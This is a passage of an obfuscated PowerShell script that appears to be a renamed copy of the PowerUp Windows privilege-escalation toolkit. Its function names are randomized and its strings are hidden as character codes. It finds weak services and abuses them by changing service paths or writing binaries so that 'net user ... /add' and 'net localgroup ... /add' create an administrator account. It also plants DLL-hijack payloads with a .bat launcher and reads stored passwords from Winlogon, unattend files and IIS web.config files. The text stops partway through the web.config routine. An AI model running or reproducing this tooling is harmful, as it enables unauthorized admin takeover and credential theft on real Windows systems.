    [CmdletBinding()] param()

     
    $ckhxu = Get-WmiObject -Class win32_service | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne '')} | Where-Object { (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'"))} | Where-Object {($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf(".exe") + 4)) -match ".* .*"}

    if ($ckhxu) {
        ForEach ($whvpx in $ckhxu) {

            $dpisg = $whvpx.pathname.split(pfc83754b32c3 32) | p022edbac03b5

            $dpisg | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                $kqzai = pe1cc616a825c -PermissionSet pfc83754b32c3 8210111511697114116 -Name $whvpx.name

                if($kqzai) {
                    $canui = $True
                }
                else {
                    $canui = $False
                }

                $yebis = New-Object PSObject
                $yebis | Add-Member Noteproperty pfc83754b32c3 83101114118105991017897109101 $whvpx.name
                $yebis | Add-Member Noteproperty pfc83754b32c3 8097116104 $whvpx.pathname
                $yebis | Add-Member Noteproperty pfc83754b32c3 7711110010510210597981081018097116104 $_
                $yebis | Add-Member Noteproperty pfc83754b32c3 83116971141167897109101 $whvpx.startname
                $yebis | Add-Member Noteproperty pfc83754b32c3 65981171151017011711099116105111110 "Write-ServiceBinary -Name '$($Service.name)' -Path <HijackPath>"
                $yebis | Add-Member Noteproperty pfc83754b32c3 67971108210111511697114116 $canui
                $yebis
            }
        }
    }
}


function p2159fc8769db {
 
    [CmdletBinding()] param()

    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {

        $zpbad = $_.name
        $jehsr = $_.pathname
        $fxtxd = $_.startname

        $jehsr | p022edbac03b5 | ForEach-Object {

            $kqzai = pe1cc616a825c -PermissionSet pfc83754b32c3 8210111511697114116 -Name $zpbad

            if($kqzai) {
                $canui = $True
            }
            else {
                $canui = $False
            }

            $yebis = New-Object PSObject
            $yebis | Add-Member Noteproperty pfc83754b32c3 83101114118105991017897109101 $zpbad
            $yebis | Add-Member Noteproperty pfc83754b32c3 8097116104 $jehsr
            $yebis | Add-Member Noteproperty pfc83754b32c3 77111100105102105979810810170105108101 $_.ModifiablePath
            $yebis | Add-Member Noteproperty pfc83754b32c3 7711110010510210597981081017010510810180101114109105115115105111110115 $_.Permissions
            $yebis | Add-Member Noteproperty pfc83754b32c3 77111100105102105979810810170105108101731001011101161051161218210110210111410111099101 $_.IdentityReference
            $yebis | Add-Member Noteproperty pfc83754b32c3 83116971141167897109101 $fxtxd
            $yebis | Add-Member Noteproperty pfc83754b32c3 65981171151017011711099116105111110 "Install-ServiceBinary -Name '$ServiceName'"
            $yebis | Add-Member Noteproperty pfc83754b32c3 67971108210111511697114116 $canui
            $yebis
        }
    }
}


function p9b61242fcf5a {
 
    [CmdletBinding()] param()

    Get-Service | pe1cc616a825c -PermissionSet pfc83754b32c3 671049711010310167111110102105103 | ForEach-Object {

        $buywp = $_ | p9d07548e391c

        $kqzai = $_ | pe1cc616a825c -PermissionSet pfc83754b32c3 8210111511697114116

        if($kqzai) {
            $canui = $True
        }
        else {
            $canui = $False
        }

        $yebis = New-Object PSObject
        $yebis | Add-Member Noteproperty pfc83754b32c3 83101114118105991017897109101 $buywp.name
        $yebis | Add-Member Noteproperty pfc83754b32c3 8097116104 $buywp.pathname
        $yebis | Add-Member Noteproperty pfc83754b32c3 83116971141167897109101 $buywp.startname
        $yebis | Add-Member Noteproperty pfc83754b32c3 65981171151017011711099116105111110 "Invoke-ServiceAbuse -Name '$($ServiceDetails.name)'"
        $yebis | Add-Member Noteproperty pfc83754b32c3 67971108210111511697114116 $canui
        $yebis
    }
}


function p9d07548e391c {
 

    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias(pfc83754b32c3 83101114118105991017897109101)]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $ecvbh
    )

    PROCESS {

        ForEach($bhyct in $ecvbh) {

            $cbphe = Get-Service -Name $bhyct

            Get-WmiObject -Class win32_service -Filter "Name='$($TargetService.Name)'" | Where-Object {$_} | ForEach-Object {
                try {
                    $_
                }
                catch{
                    Write-Verbose "Error: $_"
                    $null
                }
            }
        }
    }
}


 
 
 
 
 

function p80a60edb4d9f {
 

    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias(pfc83754b32c3 83101114118105991017897109101)]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $ecvbh,

        [String]
        $sevhs = pfc83754b32c3 106111104110,

        [String]
        $cqmrp = pfc83754b32c3 809711511511911111410049505133,

        [String]
        $rhzsg = pfc83754b32c3 6510010910511010511511611497116111114115,

        [Management.Automation.PSCredential]
        $agzde,

        [String]
        [ValidateNotNullOrEmpty()]
        $tbqbr,

        [Switch]
        $rcbud
    )

    BEGIN {

        if($gmfih[pfc83754b32c3 6711110910997110100]) {
            $wgear = @($tbqbr)
        }

        else {
            if($gmfih[pfc83754b32c3 6711410110010111011610597108]) {
                $uiizi = $agzde.UserName
                $iknsu = $agzde.GetNetworkCredential().Password
            }
            else {
                $uiizi = $sevhs
                $iknsu = $cqmrp
            }

            if($uiizi.Contains(pfc83754b32c3 92)) {
                 
                $wgear = @("net localgroup $LocalGroup $UserNameToAdd /add")
            }
            else {
                 
                $wgear = @("net user $UserNameToAdd $PasswordToAdd /add", "net localgroup $LocalGroup $UserNameToAdd /add")
            }
        }
    }

    PROCESS {

        ForEach($bhyct in $ecvbh) {

            $cbphe = Get-Service -Name $bhyct

            $buywp = $cbphe | p9d07548e391c

            $vxrby = $False
            if ($buywp.StartMode -match pfc83754b32c3 681051159798108101100) {
                Write-Verbose "Service '$(ServiceDetails.Name)' disabled, enabling..."
                $cbphe | Set-Service -StartupType Manual -ErrorAction Stop
                $vxrby = $True
            }

            $azxgt = $buywp.PathName
            $ekwrp = $buywp.State

            Write-Verbose "Service '$($TargetService.Name)' original path: '$OriginalServicePath'"
            Write-Verbose "Service '$($TargetService.Name)' original state: '$OriginalServiceState'"

            ForEach($mvbbj in $wgear) {

                if($gmfih[pfc83754b32c3 7011111499101]) {
                    $cbphe | Stop-Service -Force -ErrorAction Stop
                }
                else {
                    $cbphe | Stop-Service -ErrorAction Stop
                }

                Write-Verbose "Executing command '$ServiceCommand'"

                $pzrgu = $cbphe | p93e38adfb5d9 -binPath "$ServiceCommand"

                if (-not $pzrgu) {
                    throw "Error reconfiguring the binPath for $($TargetService.Name)"
                }

                $cbphe | Start-Service -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 2
            }

            if($gmfih[pfc83754b32c3 7011111499101]) {
                $cbphe | Stop-Service -Force -ErrorAction Stop
            }
            else {
                $cbphe | Stop-Service -ErrorAction Stop
            }

            Write-Verbose "Restoring original path to service '$($TargetService.Name)'"
            Start-Sleep -Seconds 1
            $pzrgu = $cbphe | p93e38adfb5d9 -binPath "$OriginalServicePath"

            if (-not $pzrgu) {
                throw "Error restoring the original binPath for $($TargetService.Name)"
            }

             
            if($vxrby) {
                Write-Verbose "Re-disabling service '$($TargetService.Name)'"
                $cbphe | Set-Service -StartupType Disabled -ErrorAction Stop
            }
            elseif($ekwrp -eq "Paused") {
                Write-Verbose "Starting and then pausing service '$($TargetService.Name)'"
                $cbphe | Start-Service
                Start-Sleep -Seconds 1
                $cbphe | Set-Service -Status Paused -ErrorAction Stop
            }
            elseif($ekwrp -eq "Stopped") {
                Write-Verbose "Leaving service '$($TargetService.Name)' in stopped state"
            }
            else {
                Write-Verbose "Restarting '$($TargetService.Name)'"
                $cbphe | Start-Service
            }

            $yebis = New-Object PSObject
            $yebis | Add-Member Noteproperty pfc83754b32c3 83101114118105991016598117115101100 $cbphe.Name
            $yebis | Add-Member Noteproperty pfc83754b32c3 6711110910997110100 $($wgear -join pfc83754b32c3 32383832)
            $yebis
        }
    }
}


function pd1dd533b972b {
 

    Param(
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias(pfc83754b32c3 83101114118105991017897109101)]
        [String]
        [ValidateNotNullOrEmpty()]
        $ecvbh,

        [String]
        $sevhs = pfc83754b32c3 106111104110,

        [String]
        $cqmrp = pfc83754b32c3 809711511511911111410049505133,

        [String]
        $rhzsg = pfc83754b32c3 6510010910511010511511611497116111114115,

        [Management.Automation.PSCredential]
        $agzde,

        [String]
        [ValidateNotNullOrEmpty()]
        $tbqbr,

        [String]
        $nayqn = "$(Convert-Path .)\service.exe"
    )

    BEGIN {
         
        $fwixs = ""
        [Byte[]] $ejsck = [Byte[]][Convert]::FromBase64String($fwixs)

        if($gmfih[pfc83754b32c3 6711110910997110100]) {
            $mvbbj = $tbqbr
        }
        else {
            if($gmfih[pfc83754b32c3 6711410110010111011610597108]) {
                $uiizi = $agzde.UserName
                $iknsu = $agzde.GetNetworkCredential().Password
            }
            else {
                $uiizi = $sevhs
                $iknsu = $cqmrp
            }

            if($uiizi.Contains(pfc83754b32c3 92)) {
                 
                $mvbbj = "net localgroup $LocalGroup $UserNameToAdd /add"
            }
            else {
                 
                $mvbbj = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
            }
        }
    }

    PROCESS {

        $cbphe = Get-Service -Name $ecvbh

         
        $zurjp = [System.Text.Encoding]::Unicode
        $bpehc = $zurjp.GetBytes($cbphe.Name)
        $hcuju = $zurjp.GetBytes($mvbbj)

         
        for ($ixtus=0; $ixtus -lt ($bpehc.Length); $ixtus++) {
             
            $ejsck[$ixtus+2458] = $bpehc[$ixtus]
        }
        for ($ixtus=0; $ixtus -lt ($hcuju.Length); $ixtus++) {
             
            $ejsck[$ixtus+2535] = $hcuju[$ixtus]
        }

        Set-Content -Value $ejsck -Encoding Byte -Path $nayqn -Force -ErrorAction Stop

        $yebis = New-Object PSObject
        $yebis | Add-Member Noteproperty pfc83754b32c3 83101114118105991017897109101 $cbphe.Name
        $yebis | Add-Member Noteproperty pfc83754b32c3 8097116104 $nayqn
        $yebis | Add-Member Noteproperty pfc83754b32c3 6711110910997110100 $mvbbj
        $yebis
    }
}


function p5e02372db596 {
 

    Param(
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias(pfc83754b32c3 83101114118105991017897109101)]
        [String]
        [ValidateNotNullOrEmpty()]
        $ecvbh,

        [String]
        $sevhs = pfc83754b32c3 106111104110,

        [String]
        $cqmrp = pfc83754b32c3 809711511511911111410049505133,

        [String]
        $rhzsg = pfc83754b32c3 6510010910511010511511611497116111114115,

        [Management.Automation.PSCredential]
        $agzde,

        [String]
        [ValidateNotNullOrEmpty()]
        $tbqbr
    )

    BEGIN {
        if($gmfih[pfc83754b32c3 6711110910997110100]) {
            $mvbbj = $tbqbr
        }
        else {
            if($gmfih[pfc83754b32c3 6711410110010111011610597108]) {
                $uiizi = $agzde.UserName
                $iknsu = $agzde.GetNetworkCredential().Password
            }
            else {
                $uiizi = $sevhs
                $iknsu = $cqmrp
            }

            if($uiizi.Contains(pfc83754b32c3 92)) {
                 
                $mvbbj = "net localgroup $LocalGroup $UserNameToAdd /add"
            }
            else {
                 
                $mvbbj = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
            }
        }
    }

    PROCESS {

        $cbphe = Get-Service -Name $ecvbh

        $buywp = $cbphe | p9d07548e391c

        $dpisg = $buywp.PathName | p022edbac03b5 -LiteralPaths

        if(-not $dpisg) {
            throw "Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user."
        }

        $jehsr = $dpisg | Select-Object -First 1 | Select-Object -ExpandProperty ModifiablePath
        $xakbk = "$($ServicePath).bak"

        Write-Verbose "Backing up '$ServicePath' to '$BackupPath'"

        try {
            Copy-Item -Path $jehsr -Destination $xakbk -Force
        }
        catch {
            Write-Warning "Error backing up '$ServicePath' : $_"
        }

        $vgpca = pd1dd533b972b -Name $buywp.Name -Command $mvbbj -Path $jehsr
        $vgpca | Add-Member Noteproperty pfc83754b32c3 6697991071171128097116104 $xakbk
        $vgpca
    }
}


function pd5d1aa0a5f09 {
 

    Param(
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias(pfc83754b32c3 83101114118105991017897109101)]
        [String]
        [ValidateNotNullOrEmpty()]
        $ecvbh,

        [Parameter(Position = 1)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $xakbk
    )

    PROCESS {

        $cbphe = Get-Service -Name $ecvbh

        $buywp = $cbphe | p9d07548e391c

        $dpisg = $buywp.PathName | p022edbac03b5 -LiteralPaths

        if(-not $dpisg) {
            throw "Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user."
        }

        $jehsr = $dpisg | Select-Object -First 1 | Select-Object -ExpandProperty ModifiablePath
        $xakbk = "$($ServicePath).bak"

        Copy-Item -Path $xakbk -Destination $jehsr -Force
        Remove-Item -Path $xakbk -Force

        $yebis = New-Object PSObject
        $yebis | Add-Member Noteproperty pfc83754b32c3 83101114118105991017897109101 $buywp.Name
        $yebis | Add-Member Noteproperty pfc83754b32c3 83101114118105991018097116104 $jehsr
        $yebis | Add-Member Noteproperty pfc83754b32c3 6697991071171128097116104 $xakbk
        $yebis
    }
}


 
 
 
 
 

function pb951f93b6ac4 {
 

    [CmdletBinding()]
    Param(
        [Parameter(Position=0, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias(pfc83754b32c3 80114111991011151157897109101)]
        [String[]]
        $ecvbh = $(Get-Process | Select-Object -Expand Name),

        [Switch]
        $tbyht,

        [Switch]
        $zjrtx,

        [Switch]
        $ejzdz
    )

    BEGIN {
         
         
        $asfhb = (Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
        $mwsdh = $(ForEach ($abhpw in $asfhb.GetValueNames()) { $asfhb.GetValue($abhpw) }) | Where-Object { $_.EndsWith(".dll") }
        $nhuaq = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

         
        $cafxu = @{}
        Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object { $cafxu[$_.handle] = $_.getowner().user }
    }

    PROCESS {

        ForEach ($nfrgz in $ecvbh) {

            $pwvtc = Get-Process -Name $nfrgz

            if($pwvtc -and $pwvtc.Path -and ($pwvtc.Path -ne '') -and ($pwvtc.Path -ne $Null)) {

                try {
                    $eseeu = $pwvtc.Path | Split-Path -Parent

                    $jtbpm = $pwvtc.Modules

                    $wnnmn = $cafxu[$pwvtc.Id.ToString()]

                    ForEach ($guecr in $jtbpm){

                        $fzusu = "$BasePath\$($Module.ModuleName)"

                         
                        if ((-not $fzusu.Contains(pfc83754b32c3 6758928710511010011111911592831211151161011095150)) -and (-not (Test-Path -Path $fzusu)) -and ($mwsdh -NotContains $guecr.ModuleName)) {

                            $piebf = $False

                            if($gmfih[pfc83754b32c3 691209910811710010187105110100111119115] -and $fzusu.Contains(pfc83754b32c3 67589287105110100111119115)) {
                                $piebf = $True
                            }

                            if($gmfih[pfc83754b32c3 6912099108117100101801141111031149710970105108101115] -and $fzusu.Contains(pfc83754b32c3 67589280114111103114971093270105108101115)) {
                                $piebf = $True
                            }

                            if($gmfih[pfc83754b32c3 691209910811710010179119110101100] -and $nhuaq.Contains($wnnmn)) {
                                $piebf = $True
                            }

                             
                            if (-not $piebf){
                                $yebis = New-Object PSObject
                                $yebis | Add-Member Noteproperty pfc83754b32c3 80114111991011151157897109101 $pwvtc.ProcessName
                                $yebis | Add-Member Noteproperty pfc83754b32c3 80114111991011151158097116104 $pwvtc.Path
                                $yebis | Add-Member Noteproperty pfc83754b32c3 801141119910111511579119110101114 $wnnmn
                                $yebis | Add-Member Noteproperty pfc83754b32c3 80114111991011151157210510697991079798108101687676 $fzusu
                                $yebis
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "Error: $_"
                }
            }
        }
    }
}


function p25b71836e55a {
 

    [CmdletBinding()]
    Param()

     
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(pfc83754b32c3 59) } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        $qmtwy = $_

        $dcewr = $qmtwy | p022edbac03b5 -LiteralPaths | Where-Object {$_ -and ($_ -ne $Null) -and ($_.ModifiablePath -ne $Null) -and ($_.ModifiablePath.Trim() -ne '')}
        ForEach($xgkeq in $dcewr) {
            if($xgkeq.ModifiablePath -ne $Null) {
                $xgkeq | Add-Member Noteproperty pfc83754b32c3 378065847237 $_
                $xgkeq
            }
        }
    }
}


function p11eaee28b0fd {
 

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $dvwnv,

        [String]
        [ValidateSet(pfc83754b32c3 1205654, pfc83754b32c3 1205452)]
        $dmwqa,

        [String]
        [ValidateNotNullOrEmpty()]
        $euzdk,

        [String]
        $sevhs = pfc83754b32c3 106111104110,

        [String]
        $cqmrp = pfc83754b32c3 809711511511911111410049505133,

        [String]
        $rhzsg = pfc83754b32c3 6510010910511010511511611497116111114115,

        [Management.Automation.PSCredential]
        $agzde,

        [String]
        [ValidateNotNullOrEmpty()]
        $tbqbr
    )

    function pc734c1d79452 {
     

        [CmdletBinding()]
        param(
            [Parameter(Mandatory=$True)]
            [Byte[]]
            $dedcg,

            [Parameter(Mandatory=$True)]
            [String]
            $vhfmr,

            [Parameter(Mandatory=$True)]
            [String]
            $scitt
        )

        $asrrs = ([System.Text.Encoding]::UTF8).GetBytes($scitt)

        $paewa = 0
        $rdcvh = [System.Text.Encoding]::ASCII.GetString($dedcg)
        $paewa = $rdcvh.IndexOf($vhfmr)

        if($paewa -eq 0) {
            throw("Could not find string $SearchString !")
        }

        for ($ixtus=0; $ixtus -lt $asrrs.Length; $ixtus++) {
            $dedcg[$paewa+$ixtus]=$asrrs[$ixtus]
        }

        return $dedcg
    }

    if($gmfih[pfc83754b32c3 6711110910997110100]) {
        $nxxki = $tbqbr
    }
    else {
        if($gmfih[pfc83754b32c3 6711410110010111011610597108]) {
            $uiizi = $agzde.UserName
            $iknsu = $agzde.GetNetworkCredential().Password
        }
        else {
            $uiizi = $sevhs
            $iknsu = $cqmrp
        }

        if($uiizi.Contains(pfc83754b32c3 92)) {
             
            $nxxki = "net localgroup $LocalGroup $UserNameToAdd /add"
        }
        else {
             
            $nxxki = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
        }
    }

     
    $aetvg = ""
    $wfbbu = ""

    if($gmfih[pfc83754b32c3 651149910410511610199116117114101]) {
        $tsers = $dmwqa
    }
    elseif($Env:PROCESSOR_ARCHITECTURE -eq pfc83754b32c3 6577685452) {
        $tsers = pfc83754b32c3 1205452
    }
    else {
        $tsers = pfc83754b32c3 1205654
    }

    if($tsers -eq pfc83754b32c3 1205452) {
        [Byte[]]$dedcg = [Byte[]][Convert]::FromBase64String($wfbbu)
    }
    else {
        [Byte[]]$dedcg = [Byte[]][Convert]::FromBase64String($aetvg)
    }

    if($gmfih[pfc83754b32c3 66971168097116104]) {
        $qdwqd = $euzdk
    }
    else {
        $eseeu = $dvwnv | Split-Path -Parent
        $qdwqd = "$BasePath\debug.bat"
    }

     
    $dedcg = Invoke-PatchDll -DllBytes $dedcg -SearchString pfc83754b32c3 10010198117103469897116 -ReplaceString $qdwqd

     
    if (Test-Path $qdwqd) { Remove-Item -Force $qdwqd }

    "@echo off" | Out-File -Encoding ASCII -Append $qdwqd
    "start /b $BatCommand" | Out-File -Encoding ASCII -Append $qdwqd
    pfc83754b32c3 11511697114116324798323434329910910032479932100101108323437126102483438101120105116324798 | Out-File -Encoding ASCII -Append $qdwqd

    Write-Verbose ".bat launcher written to: $TargetBatPath"

    Set-Content -Value $dedcg -Encoding Byte -Path $dvwnv
    Write-Verbose "$TargetArchitecture DLL Hijacker written to: $DllPath"

    $yebis = New-Object PSObject
    $yebis | Add-Member Noteproperty pfc83754b32c3 681081088097116104 $dvwnv
    $yebis | Add-Member Noteproperty pfc83754b32c3 651149910410511610199116117114101 $tsers
    $yebis | Add-Member Noteproperty pfc83754b32c3 66971167697117110991041011148097116104 $qdwqd
    $yebis | Add-Member Noteproperty pfc83754b32c3 6711110910997110100 $nxxki
    $yebis
}


 
 
 
 
 

function p2d03135f6dbe {
 

    [CmdletBinding()]
    Param()

    $wtpwy = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    if (Test-Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer") {

        $vsrvb = (Get-ItemProperty -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallElevated)"

        if ($vsrvb.AlwaysInstallElevated -and ($vsrvb.AlwaysInstallElevated -ne 0)){

            $buzed = (Get-ItemProperty -Path "HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"

            if ($buzed.AlwaysInstallElevated -and ($buzed.AlwaysInstallElevated -ne 0)){
                Write-Verbose "AlwaysInstallElevated enabled on this machine!"
                $True
            }
            else{
                Write-Verbose "AlwaysInstallElevated not enabled on this machine."
                $False
            }
        }
        else{
            Write-Verbose "AlwaysInstallElevated not enabled on this machine."
            $False
        }
    }
    else{
        Write-Verbose "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist"
        $False
    }

    $ErrorActionPreference = $wtpwy
}


function pf07416a57a01 {
 

    [CmdletBinding()]
    Param()

    $ndaww = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)

    Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"

    if ($ndaww -and ($ndaww.AutoAdminLogon -ne 0)) {

        $pqvpc = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $qzjdn = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $rtytp = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
        $kbugq = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $vatem = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $hvpmr = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword

        if ($qzjdn -or $vatem) {
            $yebis = New-Object PSObject
            $yebis | Add-Member Noteproperty pfc83754b32c3 681011029711710811668111109971051107897109101 $pqvpc
            $yebis | Add-Member Noteproperty pfc83754b32c3 6810110297117108116851151011147897109101 $qzjdn
            $yebis | Add-Member Noteproperty pfc83754b32c3 68101102971171081168097115115119111114100 $rtytp
            $yebis | Add-Member Noteproperty pfc83754b32c3 65108116681011029711710811668111109971051107897109101 $kbugq
            $yebis | Add-Member Noteproperty pfc83754b32c3 651081166810110297117108116851151011147897109101 $vatem
            $yebis | Add-Member Noteproperty pfc83754b32c3 6510811668101102971171081168097115115119111114100 $hvpmr
            $yebis
        }
    }
}

function pe216079b68bd {
 

    [CmdletBinding()]
    Param()

    $cjucv = @(   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
                        )

    $wtpwy = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $cjucv | Where-Object { Test-Path $_ } | ForEach-Object {

        $asfhb = Get-Item -Path $_
        $uwjtp = $_

        ForEach ($ecvbh in $asfhb.GetValueNames()) {

            $nayqn = $($asfhb.GetValue($ecvbh))

            $nayqn | p022edbac03b5 | ForEach-Object {
                $yebis = New-Object PSObject
                $yebis | Add-Member Noteproperty pfc83754b32c3 75101121 "$ParentPath\$Name"
                $yebis | Add-Member Noteproperty pfc83754b32c3 8097116104 $nayqn
                $yebis | Add-Member Noteproperty pfc83754b32c3 77111100105102105979810810170105108101 $_
                $yebis
            }
        }
    }

    $ErrorActionPreference = $wtpwy
}


 
 
 
 
 

function pe616f0e08f19 {
 

    [CmdletBinding()]
    Param()

    $wtpwy = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $nayqn = "$($ENV:windir)\System32\Tasks"

     
    Get-ChildItem -Path $nayqn -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            $kpqmj = $_.Name
            $cazac = [xml] (Get-Content $_.FullName)
            if($cazac.Task.Triggers) {

                $xjdri = $cazac.Task.Triggers.OuterXML

                 
                $cazac.Task.Actions.Exec.Command | p022edbac03b5 | ForEach-Object {
                    $yebis = New-Object PSObject
                    $yebis | Add-Member Noteproperty pfc83754b32c3 84971151077897109101 $kpqmj
                    $yebis | Add-Member Noteproperty pfc83754b32c3 8497115107701051081018097116104 $_
                    $yebis | Add-Member Noteproperty pfc83754b32c3 849711510784114105103103101114 $xjdri
                    $yebis
                }

                 
                $cazac.Task.Actions.Exec.Arguments | p022edbac03b5 | ForEach-Object {
                    $yebis = New-Object PSObject
                    $yebis | Add-Member Noteproperty pfc83754b32c3 84971151077897109101 $kpqmj
                    $yebis | Add-Member Noteproperty pfc83754b32c3 8497115107701051081018097116104 $_
                    $yebis | Add-Member Noteproperty pfc83754b32c3 849711510784114105103103101114 $xjdri
                    $yebis
                }
            }
        }
        catch {
            Write-Verbose "Error: $_"
        }
    }

    $ErrorActionPreference = $wtpwy
}


function p0d7e58e5f500 {
 

    $wtpwy = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $cjucv = @(   "c:\sysprep\sysprep.xml",
                            "c:\sysprep\sysprep.inf",
                            "c:\sysprep.inf",
                            (Join-Path $Env:WinDir "\Panther\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\Panther\unattend.xml")
                        )

     
    $cjucv | Where-Object { Test-Path $_ } | ForEach-Object {
        $yebis = New-Object PSObject
        $yebis | Add-Member Noteproperty pfc83754b32c3 85110971161161011101008097116104 $_
        $yebis
    }

    $ErrorActionPreference = $wtpwy
}


function pd9f08a01e613 {
 

    [CmdletBinding()]
    Param()

    $wtpwy = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

     
    if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {

         
        $dqvfc = New-Object System.Data.DataTable

         
        $Null = $dqvfc.Columns.Add("user")
        $Null = $dqvfc.Columns.Add("pass")
        $Null = $dqvfc.Columns.Add("dbserv")
        $Null = $dqvfc.Columns.Add("vdir")
        $Null = $dqvfc.Columns.Add("path")
        $Null = $dqvfc.Columns.Add("encr")

         
        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath | 
        ForEach-Object {

            $zabhq = $_

             
            if ($_ -like "*%*") {
                $dkczi = "`$Env:"+$_.split("%")[1]
                $dxqxs = Invoke-Expression $dkczi
                $rtxhj = $_.split("%")[2]
                $zabhq  = $dxqxs+$rtxhj
            }

             
            $zabhq | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {

                 
                $fxhrz = $_.fullname

                 
                [xml]$zvzfh = Get-Content $_.fullname

                 
                if ($zvzfh.configuration.connectionStrings.add) {

                     
                    $zvzfh.configuration.connectionStrings.add| 
                    ForEach-Object {

                        [String]$qveet = $_.connectionString
                        if($qveet -like "*password*") {
                            $rqtir = $qveet.Split("=")[3].Split(";")[0]
                            $fvjub = $qveet.Split("=")[4].Split(";")[0]
                            $aknya = $qveet.Split("=")[1].Split(";")[0]
                            $ezedx = $zabhq
                            $zvmuw = $fxhrz
                            $kxhaf = "No"
                            $Null = $dqvfc.Rows.Add($rqtir, $fvjub, $aknya,$ezedx,$fxhrz, $kxhaf)
                        }
                    }
                }
                else {

                     
